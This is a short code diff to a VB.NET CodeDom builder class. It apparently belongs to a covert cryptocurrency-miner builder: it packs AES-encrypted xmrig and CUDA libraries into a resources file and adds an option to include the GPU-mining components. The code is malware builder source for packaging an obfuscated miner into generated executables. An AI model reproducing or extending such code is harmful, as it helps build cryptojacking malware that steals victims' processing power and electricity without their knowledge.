@@ -33,9 +33,11 @@ Public Class Codedom
             Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
                 R.AddResource(F.Resources_dll, AES_Encryptor(My.Resources.Project1))
                 R.AddResource(F.Resources_xmr, AES_Encryptor(My.Resources.xmrig))
-                R.AddResource(F.Resources_cuda1, AES_Encryptor(My.Resources.xmrig_cuda))
-                R.AddResource(F.Resources_cuda2, AES_Encryptor(My.Resources.nvrtc64_101_0))
-                R.AddResource(F.Resources_cuda3, AES_Encryptor(My.Resources.nvrtc_builtins64_101))
+                If (F.toggleEnableGPU.Checked) Then
+                    R.AddResource(F.Resources_cuda1, AES_Encryptor(My.Resources.xmrig_cuda))
+                    R.AddResource(F.Resources_cuda2, AES_Encryptor(My.Resources.nvrtc64_101_0))
+                    R.AddResource(F.Resources_cuda3, AES_Encryptor(My.Resources.nvrtc_builtins64_101))
+                End If
                 R.Generate()
             End Using
 
